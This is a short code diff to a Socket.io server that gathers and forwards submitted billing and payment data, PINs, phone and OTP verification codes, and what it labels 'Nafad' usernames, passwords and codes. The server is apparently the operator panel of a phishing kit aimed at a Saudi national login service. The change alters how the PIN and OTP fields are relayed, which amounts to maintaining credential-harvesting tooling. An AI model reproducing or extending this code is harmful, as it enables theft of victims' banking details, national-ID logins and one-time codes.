@@ -97,11 +97,11 @@ io.on("connection", (socket) => {
       comprehensive: comprehensiveArr,
       billing: billingArr,
       payment: paymentArr,
-      pin: pins["verificationCode"],
+      pin: pins,
       phoneSubs, // phone submissions
-      verification_code_three: phoneCodes["code"], // phone-code submissions
+      verification_code_three: phoneCodes, // phone-code submissions
       thirdPartys,
-      verification_code_two: verifs["code"], // final verifications (OTP)
+      verification_code_two: verifs, // final verifications (OTP)
       nafadLogins, // Nafad username/password
       nafadCodes, // Nafad two‑digit codes
       flags, // user.flag
